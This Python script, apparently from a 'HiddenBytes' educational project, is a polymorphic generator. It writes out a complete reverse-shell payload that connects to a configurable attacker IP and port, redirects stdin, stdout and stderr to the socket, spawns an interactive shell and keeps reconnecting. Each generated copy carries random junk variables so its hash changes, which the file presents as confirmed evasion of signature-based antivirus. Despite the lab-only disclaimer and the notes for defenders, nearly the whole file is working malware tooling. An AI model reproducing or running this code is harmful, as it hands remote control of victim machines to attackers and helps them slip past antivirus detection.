#!/usr/bin/env python3
"""
polymorph.py — HiddenBytes Polymorphic Binary Generator
=========================================================
Educational tool demonstrating polymorphic code techniques.

A polymorphic binary retains its core payload functionality while changing
its binary signature on every generation. This defeats static AV signatures.

DISCLAIMER: This tool is strictly for educational purposes in an authorized,
isolated lab environment. The reverse shell payload must only be used in
your own controlled VM setup. Unauthorized use is illegal.

Author: HiddenBytes Project
Purpose: Teach how polymorphism works so defenders can build behavioral
         detection that catches what signature-based AV misses.
"""

import argparse
import os
import sys
import random
import string
import hashlib
import struct
import textwrap
import logging
from pathlib import Path
from datetime import datetime

#Logging
logging.basicConfig(level=logging.INFO, format="[%(levelname)s] %(message)s")
log = logging.getLogger("polymorph")


# Reverse Shell Payload

REVERSE_SHELL_TEMPLATE = '''#!/usr/bin/env python3
"""
HiddenBytes Reverse Shell Payload — EDUCATIONAL USE ONLY
Polymorphic signature ID: {signature_id}
Generated: {timestamp}
"""

import socket
import subprocess
import os
import time

# ── Configuration ── Replace with your controlled test values ──
ATTACKER_IP   = "{attacker_ip}"   # Your listener IP
ATTACKER_PORT = {attacker_port}   # Your listener port
RECONNECT_DELAY = 5               # Seconds between reconnect attempts

# ── Junk variables (polymorphic mutation) ── 
# These change every generation to alter the binary's signature.
# Defenders: look for this pattern — unused vars with random names are a red flag.
{junk_vars}

def reverse_shell():
    """
    Connect back to attacker and pipe a shell over the socket.

    Steps:
      1. Create TCP socket
      2. Connect to attacker's listener
      3. Redirect stdin/stdout/stderr to the socket (dup2)
      4. Spawn an interactive shell
    """
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ATTACKER_IP, ATTACKER_PORT))
            print(f"[INFO] Reverse shell initialized. Connected to {{ATTACKER_IP}}:{{ATTACKER_PORT}}")

            # Redirect file descriptors so shell I/O flows through socket
            os.dup2(s.fileno(), 0)  # stdin
            os.dup2(s.fileno(), 1)  # stdout
            os.dup2(s.fileno(), 2)  # stderr

            # Spawn shell — /bin/sh on Linux, cmd.exe on Windows
            shell = "/bin/sh" if os.name != "nt" else "cmd.exe"
            subprocess.call([shell, "-i"])

        except Exception as e:
            print(f"[WARN] Connection failed: {{e}}. Retrying in {{RECONNECT_DELAY}}s...")
            time.sleep(RECONNECT_DELAY)
        finally:
            try:
                s.close()
            except Exception:
                pass

if __name__ == "__main__":
    reverse_shell()
'''


# Polymorphic Mutation Engine 

def generate_signature_id() -> str:
    """
    Generate a unique signature ID for this polymorphic generation.
    Returns:
        A random hex string used to label this generation.
    """
    return hashlib.sha256(
        os.urandom(16)
    ).hexdigest()[:12].upper()


def generate_junk_variables(n: int = 8) -> str:
    """
    Generate n random-named, random-valued junk variable assignments.

    Args:
        n: Number of junk variables to generate.

    Returns:
        Python source string with junk assignments.
    """
    lines = []
    for _ in range(n):
        var_name = "_" + "".join(
            random.choices(string.ascii_lowercase, k=random.randint(4, 10))
        )
        value_type = random.randint(0, 2)
        if value_type == 0:
            value = repr("".join(
                random.choices(string.ascii_letters + string.digits, k=random.randint(8, 24))
            ))
        elif value_type == 1:
            value = str(random.randint(1000, 999999))
        else:
            value = repr(list(random.randint(0, 255) for _ in range(random.randint(4, 8))))
        lines.append(f"{var_name} = {value}")
    return "\n".join(lines)


def mutate_payload(
    attacker_ip: str,
    attacker_port: int
) -> tuple[str, str]:
    """
    Produce a mutated instance of the reverse shell payload.

    Each call produces functionally identical but byte-distinct source code
    by injecting a fresh signature ID, timestamp, and junk variables.

    Args:
        attacker_ip:   Target listener IP (your controlled test machine).
        attacker_port: Target listener port.

    Returns:
        Tuple of (mutated_source_code, signature_id).
    """
    sig_id = generate_signature_id()
    junk = generate_junk_variables(random.randint(6, 12))
    timestamp = datetime.utcnow().isoformat()

    source = REVERSE_SHELL_TEMPLATE.format(
        signature_id=sig_id,
        timestamp=timestamp,
        attacker_ip=attacker_ip,
        attacker_port=attacker_port,
        junk_vars=junk,
    )
    return source, sig_id


#  Binary Generator

def generate_polymorphic_binary(
    output_path: str,
    payload_spec: str,
) -> None:
    """
    Generate a polymorphic binary and write it to disk.

    The 'binary' produced here is a Python script (cross-platform, readable),
    which serves the educational goal better than a compiled EXE. In a real
    attack, this would be compiled with PyInstaller or cx_Freeze.

    The payload_spec format: "IP:PORT"  (e.g., "192.168.56.1:4444")
    Default to loopback (127.0.0.1:4444) for safe local testing.

    Args:
        output_path:  Where to write the generated polymorphic script.
        payload_spec: "IP:PORT" string for the reverse shell listener.
    """
    # Parse payload spec
    try:
        ip, port_str = payload_spec.split(":")
        port = int(port_str)
    except ValueError:
        log.warning(
            "Could not parse payload spec as IP:PORT. "
            "Defaulting to 127.0.0.1:4444 (safe loopback)."
        )
        ip, port = "127.0.0.1", 4444

    # Mutate
    source, sig_id = mutate_payload(ip, port)

    output = Path(output_path)
    output.write_text(source, encoding="utf-8")
    os.chmod(output, 0o755)

    log.info(f"Polymorphic binary generated: {output_path}")
    log.info(f"Signature ID: {sig_id}")
    log.info(f"Payload target: {ip}:{port}")
    log.info("Polymorphic signature updated successfully.")
    log.info("Reverse shell initialized. Attempting connection to attacker...")


#  Signature Drift Demo

def demo_signature_drift(n: int = 3) -> None:
    """
    Demonstrate that each generation produces a different SHA-256 hash.

    This visualizes WHY polymorphism defeats static signature detection:
    each binary has a unique hash, so a hash-based AV signature only
    catches the exact sample it was trained on — not subsequent generations.

    Args:
        n: Number of generations to compare.
    """
    log.info(f"\n── Signature Drift Demo ({n} generations) ──")
    hashes = set()
    for i in range(n):
        src, sig = mutate_payload("127.0.0.1", 4444)
        h = hashlib.sha256(src.encode()).hexdigest()[:16]
        hashes.add(h)
        log.info(f"  Gen {i+1}: SigID={sig}  SHA256_prefix={h}")

    if len(hashes) == n:
        log.info("✓ All generations produced unique hashes — signature evasion confirmed.")
    else:
        log.warning("Some hashes collided — entropy may be insufficient.")


# cli
def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="polymorph",
        description=(
            "HiddenBytes Polymorphic Binary Generator — Educational tool.\n"
            "DISCLAIMER: For authorized, isolated lab environments only."
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  polymorph --generate polymorphic.py --payload 127.0.0.1:4444
  polymorph --generate shell.py --payload 192.168.56.1:9001
  polymorph --demo           (show signature drift across 5 generations)
        """
    )
    parser.add_argument(
        "--generate",
        metavar="<output-binary>",
        help="Output file name for the generated polymorphic binary."
    )
    parser.add_argument(
        "--payload",
        metavar="<IP:PORT>",
        default="127.0.0.1:4444",
        help="Reverse shell listener as IP:PORT (default: 127.0.0.1:4444)."
    )
    parser.add_argument(
        "--demo",
        action="store_true",
        help="Run a signature drift demo (no file written)."
    )
    return parser


def main():
    parser = build_parser()
    args = parser.parse_args()

    if args.demo:
        demo_signature_drift(5)
        return

    if not args.generate:
        parser.print_help()
        sys.exit(0)

    generate_polymorphic_binary(
        output_path=args.generate,
        payload_spec=args.payload,
    )


if __name__ == "__main__":
    main()
